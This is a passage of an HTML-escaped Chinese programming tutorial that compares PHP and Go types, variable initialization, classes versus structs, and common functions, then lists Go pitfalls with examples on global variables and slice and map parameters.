3)关联数组&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;实例化类class&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Go&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;bool&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;string&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;int、int8、int16、int32、int64、uint、uint8、uint16、uint32、uint64&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;float32、float64&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;[length]type&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;比较像struct&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p data-line=&quot;88&quot;&gt;&lt;span&gt;除此之外Go还支持更丰富的类型：&lt;/span&gt;&lt;/p&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;span&gt;类型&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;slice切片(相当于PHP的索引数组)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;map(相当于PHP的关联数组)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;channel(管道，通过通信共享，不要通过共享来通信)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;指针(Go语言的值类型都有对应的指针类型)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;byte(字节，对应uint8别名，可以表示Ascaii码)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;rune(对应int32，可以表示unicode)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;等等&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;自定义类型，例如&lt;/span&gt;&lt;code&gt;&lt;span&gt;type userDefinedType int32&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 data-line=&quot;100&quot;&gt;&lt;span&gt;常用基本类型初始化方式对比&lt;/span&gt;&lt;/h2&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;span&gt;类型&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;PHP&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;Go(定义变量带&lt;/span&gt;&lt;code&gt;&lt;span&gt;var&lt;/span&gt;&lt;/code&gt;&lt;span&gt;关键字，或者不带直接使用语法糖&lt;/span&gt;&lt;code&gt;&lt;span&gt;:=&lt;/span&gt;&lt;/code&gt;&lt;span&gt;)&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;boolean&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;$varStr = true;&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varStr bool = true&lt;/span&gt;&lt;/code&gt;&lt;br/&gt;&lt;span&gt;或者 &lt;/span&gt;&lt;code&gt;&lt;span&gt;var varStr = true&lt;/span&gt;&lt;/code&gt;&lt;br/&gt;&lt;span&gt;或者 &lt;/span&gt;&lt;code&gt;&lt;span&gt;varStr := true&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;string&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;$varStr = &#x27;demo&#x27;;&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varStr string = &quot;&quot;&lt;/span&gt;&lt;/code&gt;&lt;br/&gt;&lt;span&gt;或者 &lt;/span&gt;&lt;code&gt;&lt;span&gt;varStr := &quot;&quot;&lt;/span&gt;&lt;/code&gt;&lt;span&gt;(:=写法下面省略)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;int32&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;$varNum = 0;&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varInt32 int32 = 0&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;int64&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;同上&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varInt64 int64 = 0&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;float32&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;$varNum = 0.01;&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varFloat32 float32 = 0&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;float64&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;同上&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varFloat64 float64 = 0&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;array&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;$varArray = array();&lt;/span&gt;&lt;/code&gt;&lt;br/&gt;&lt;span&gt;或者语法糖&lt;/span&gt;&lt;code&gt;&lt;span&gt;$varArray = [];&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varArray [6]int32 = [6]int32{}&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;slice(切片)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;同上，PHP叫索引数据&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varSlice []int32 = []int32{}&lt;/span&gt;&lt;/code&gt;&lt;span&gt;切片相对于数据会自动扩容&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;map&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;$varMap = array(&#x27;key&#x27; =&amp;gt; &#x27;value&#x27;);&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varMap map[string]int32 = map[string]int32{}&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;closure(闭包)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;$varClosure = function() {};&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varClosure func() = func() {}&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;channel&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;无&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varChannel chan string = make(chan string)&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 无缓存channel；&lt;br/&gt;&lt;/span&gt;&lt;code&gt;&lt;span&gt;var varChannelBuffer chan string = make(chan string, 6)&lt;/span&gt;&lt;/code&gt;&lt;span&gt;有缓存channel&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 data-line=&quot;116&quot;&gt;&lt;span&gt;PHP类的实例化和Go结构体的初始化的对比&lt;/span&gt;&lt;/h2&gt;&lt;p data-line=&quot;118&quot;&gt;&lt;span&gt;PHP类的实例化&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;119&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;/* &lt;br/&gt;定义class&lt;br/&gt;*/&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;ClassDemo&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;// 私有属性&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;$privateVar&lt;/span&gt; = &lt;span&gt;&quot;&quot;&lt;/span&gt;;&lt;br/&gt;    &lt;span&gt;// 公有属性&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;$publicVar&lt;/span&gt; = &lt;span&gt;&quot;&quot;&lt;/span&gt;;&lt;br/&gt;    &lt;span&gt;// 构造函数&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;function&lt;/span&gt; &lt;span&gt;__construct&lt;/span&gt;()&lt;br/&gt;    &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;// 实例化类时执行&lt;/span&gt;&lt;br/&gt;    }&lt;br/&gt;    &lt;span&gt;// 私有方法&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;&lt;span&gt;function&lt;/span&gt; &lt;span&gt;privateFun&lt;/span&gt;()&lt;br/&gt;    &lt;/span&gt;{&lt;br/&gt;    &lt;br/&gt;    }&lt;br/&gt;    &lt;span&gt;// 公有方法&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;function&lt;/span&gt; &lt;span&gt;publicFun&lt;/span&gt;()&lt;br/&gt;    &lt;/span&gt;{&lt;br/&gt;    &lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 实例化类ClassDemo 获取类ClassDemo的对象&lt;/span&gt;&lt;br/&gt;&lt;span&gt;$varObject&lt;/span&gt; = &lt;span&gt;new&lt;/span&gt; ClassDemo(); &lt;span&gt;// 对象(类)&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;149&quot;&gt;&lt;span&gt;Go结构体的初始化&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;150&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;// 包初始化时执行&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;init&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; StructDemo &lt;span&gt;struct&lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;// 小写开头驼峰表示私有属性&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;// 不可导出&lt;/span&gt;&lt;br/&gt;    privateVar &lt;span&gt;string&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;// 大写开头驼峰表示公有属性&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;// 可导出&lt;/span&gt;&lt;br/&gt;    PublicVar &lt;span&gt;string&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 小写开头驼峰表示私有方法&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 结构体StructDemo的私有方法&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;(demo *StructDemo)&lt;/span&gt; &lt;span&gt;privateFun&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;error&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; &lt;span&gt;nil&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 大写开头驼峰表示公有属性&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 结构体StructDemo的公有方法&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;(demo *StructDemo)&lt;/span&gt; &lt;span&gt;PublicFun&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;error&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; &lt;span&gt;nil&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 初始化结构体StructDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// structDemo := &amp;amp;StructDemo{}&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;181&quot;&gt;&lt;span&gt;常用函数对比&lt;/span&gt;&lt;/h2&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;span&gt;常用函数描述&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;PHP&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;Go&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;数组长度&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;count()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;len()&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;分割字符串为数组&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;explode()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;strings.Split(s string, sep string) []string&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;转大写&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;strtoupper()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;strings.ToUpper(s string) string&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;转小写&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;strtolower()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;strings.ToLower(s string) string&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;去除空格&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;trim()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;strings.Trim(s, cutset string) string&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;json序列化&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;json_encode()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;json.Marshal(v interface{}) ([]byte, error)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;json反序列化&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;json_decode()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;json.Unmarshal(data []byte, v interface{}) error&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;序列化(不再建议使用)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;serialize()、unserialize()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;包https://github.com/wulijun/go-php-serialize&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;md5&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;md5()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;包crypto/md5&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;终端输出&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;echo、var_dump等&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;fmt.Println(a ...interface{})&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;各种类型互转&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;intval()等&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;包strconv&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h1 data-line=&quot;197&quot;&gt;&lt;span&gt;避坑指南&lt;/span&gt;&lt;/h1&gt;&lt;ol class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;谨慎使用全局变量，全局变量不会像PHP一样，在完成一次请求之后被销毁&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;形参是slice、map类型的参数，注意值可被全局修改&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;资源使用完毕，记得释放资源或回收资源&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;不要依赖map遍历的顺序&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;不要并发写map&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;注意判断指针类型不为空nil，再操作&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;Go语言不支持继承，但是有合成复用&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h2 data-line=&quot;207&quot;&gt;&lt;span&gt;1. 谨慎使用全局变量，全局变量不会像PHP一样，在完成一次请求之后被销毁&lt;/span&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code data-line=&quot;209&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;github.com/gin-gonic/gin&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 全局变量不会像PHP一样，在完成一次请求之后被销毁&lt;/span&gt;&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; GlobalVarDemo &lt;span&gt;int32&lt;/span&gt; = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 模拟接口逻辑&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;r := gin.Default()&lt;br/&gt;r.GET(&lt;span&gt;&quot;/ping&quot;&lt;/span&gt;, &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;atomic.AddInt32(&amp;amp;GlobalVarDemo,1)&lt;br/&gt;c.JSON(&lt;span&gt;200&lt;/span&gt;, gin.H{&lt;br/&gt;&lt;span&gt;&quot;message&quot;&lt;/span&gt;: GlobalVarDemo,&lt;br/&gt;})&lt;br/&gt;})&lt;br/&gt;r.Run()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 我们多次请求接口，可以很明显发现：全局变量不会像PHP一样，在完成一次请求之后被销毁。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 但是PHP不一样，全局变量在完成一次请求之后会被自动销毁。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// curl &quot;127.0.0.1:8080/ping&quot; &lt;/span&gt;&lt;br/&gt;&lt;span&gt;// {&quot;message&quot;:1}                                                                     &lt;/span&gt;&lt;br/&gt;&lt;span&gt;// curl &quot;127.0.0.1:8080/ping&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// {&quot;message&quot;:2} &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt;&lt;span&gt; 值在递增&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// curl &quot;127.0.0.1:8080/ping&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// {&quot;message&quot;:3} &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt; 值在递增&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;241&quot;&gt;&lt;span&gt;2. 形参是&lt;/span&gt;&lt;code&gt;&lt;span&gt;slice&lt;/span&gt;&lt;/code&gt;&lt;span&gt;、&lt;/span&gt;&lt;code&gt;&lt;span&gt;map&lt;/span&gt;&lt;/code&gt;&lt;span&gt;类型的参数，注意值可被全局修改&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;243&quot;&gt;&lt;p data-line=&quot;243&quot;&gt;&lt;span&gt;类似PHP的引用传递，Go里面都是值传递，具体原因下面说&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;245&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;// 切片&lt;/span&gt;&lt;br/&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; &lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;paramDemo := []&lt;span&gt;int32&lt;/span&gt;{&lt;span&gt;1&lt;/span&gt;}&lt;br/&gt;fmt.Printf(&lt;span&gt;&quot;main.paramDemo 1 %v, pointer: %p \n&quot;&lt;/span&gt;, paramDemo, &amp;amp;paramDemo)&lt;br/&gt;&lt;span&gt;// 浅拷贝&lt;/span&gt;&lt;br/&gt;demo(paramDemo)&lt;br/&gt;fmt.Printf(&lt;span&gt;&quot;main.paramDemo 2 %v, pointer: %p \n&quot;&lt;/span&gt;, paramDemo, &amp;amp;paramDemo)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;demo&lt;/span&gt;&lt;span&gt;(paramDemo []&lt;span&gt;int32&lt;/span&gt;)&lt;/span&gt; &lt;span&gt;([]&lt;span&gt;int32&lt;/span&gt;, error)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;fmt.Printf(&lt;span&gt;&quot;main.demo.paramDemo pointer: %p \n&quot;&lt;/span&gt;, &amp;amp;paramDemo)&lt;br/&gt;paramDemo[&lt;span&gt;0&lt;/span&gt;] = &lt;span&gt;2&lt;/span&gt;&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; paramDemo, &lt;span&gt;nil&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 1 [1], pointer: 0xc00000c048&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.demo.paramDemo pointer: 0xc00000c078 &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt; 内存地址不一样，发生了值拷贝&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;br/&gt;// main.paramDemo 2 [2] &lt;/span&gt;&lt;span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt; 原值被修改&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 1 [1], pointer: 0xc0000a6030&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.demo.paramDemo pointer: 0xc0000a6060 &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt; 内存地址不一样，发生了值拷贝&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;br/&gt;// main.paramDemo 2 [2], pointer: 0xc0000a6030 &lt;/span&gt;&lt;span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt; 原值还是被修改了&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;//===========数组就没有这个问题===========&lt;/span&gt;&lt;br/&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; &lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;paramDemo := [&lt;span&gt;1&lt;/span&gt;]&lt;span&gt;int32&lt;/span&gt;{&lt;span&gt;1&lt;/span&gt;}&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;main.paramDemo 1&quot;&lt;/span&gt;, paramDemo)&lt;br/&gt;demo(paramDemo)&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;main.paramDemo 2&quot;&lt;/span&gt;, paramDemo)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;demo&lt;/span&gt;&lt;span&gt;(paramDemo [1]&lt;span&gt;int32&lt;/span&gt;)&lt;/span&gt; &lt;span&gt;([1]&lt;span&gt;int32&lt;/span&gt;, error)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;paramDemo[&lt;span&gt;0&lt;/span&gt;] = &lt;span&gt;2&lt;/span&gt;&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; paramDemo, &lt;span&gt;nil&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 1 [1]&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 2 [1] &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt; 值未被修改&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;//===========Map同样有这个问题===========&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; &lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;paramDemo := &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt;{&lt;br/&gt;&lt;span&gt;&quot;a&quot;&lt;/span&gt;: &lt;span&gt;&quot;a&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;main.paramDemo 1&quot;&lt;/span&gt;, paramDemo)&lt;br/&gt;demo(paramDemo)&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;main.paramDemo 2&quot;&lt;/span&gt;, paramDemo)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;demo&lt;/span&gt;&lt;span&gt;(paramDemo &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt;)&lt;/span&gt; &lt;span&gt;(&lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt;, 